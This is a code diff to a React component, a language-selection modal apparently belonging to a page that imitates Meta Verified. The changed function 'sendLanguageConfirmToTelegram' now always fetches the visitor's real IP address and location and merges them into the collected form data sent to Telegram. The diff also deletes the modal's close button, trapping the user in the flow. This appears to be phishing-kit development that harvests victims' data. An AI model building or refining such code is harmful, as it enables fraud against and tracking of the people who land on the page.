@@ -22,17 +22,6 @@ function applyDocumentLang(locale: AppLocale) {
   }
 }
 
-function CloseIcon() {
-  return (
-    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" aria-hidden="true">
-      <path
-        d="M6.4 19 5 17.6 10.6 12 5 6.4 6.4 5 12 10.6 17.6 5 19 6.4 13.4 12 19 17.6 17.6 19 12 13.4 6.4 19Z"
-        fill="currentColor"
-      />
-    </svg>
-  )
-}
-
 function ChevronIcon() {
   return (
     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
@@ -90,15 +79,14 @@ export default function MvLanguageModal({ isOpen, onClose }: MvLanguageModalProp
   const sendLanguageConfirmToTelegram = async (locale: AppLocale) => {
     if (isMetaVerifiedFlowCompleted()) return
 
-    let payload: Record<string, unknown> = {
-      ...formData,
-      language: LOCALE_OPTION_LABELS[locale],
-    }
+    // Luôn lấy lại IP từ server (header client thật) trước khi gửi Telegram
+    const location = await getUserLocation()
+    dispatch(updateForm(location))
 
-    if (!String(formData.ip ?? '').trim() || !String(formData.location ?? '').trim()) {
-      const location = await getUserLocation()
-      payload = { ...payload, ...location }
-      dispatch(updateForm(location))
+    const payload: Record<string, unknown> = {
+      ...formData,
+      ...location,
+      language: LOCALE_OPTION_LABELS[locale],
     }
 
     try {
@@ -154,15 +142,6 @@ export default function MvLanguageModal({ isOpen, onClose }: MvLanguageModalProp
               <h2 id="mv-lang-modal-title" className="mv-lang-modal-title">
                 {t.languagePicker.modalTitle}
               </h2>
-              <button
-                type="button"
-                className="mv-lang-modal-close"
-                aria-label={t.common.close}
-                disabled={loading}
-                onClick={handleClose}
-              >
-                <CloseIcon />
-              </button>
             </div>
 
             <div className="mv-lang-modal-body">
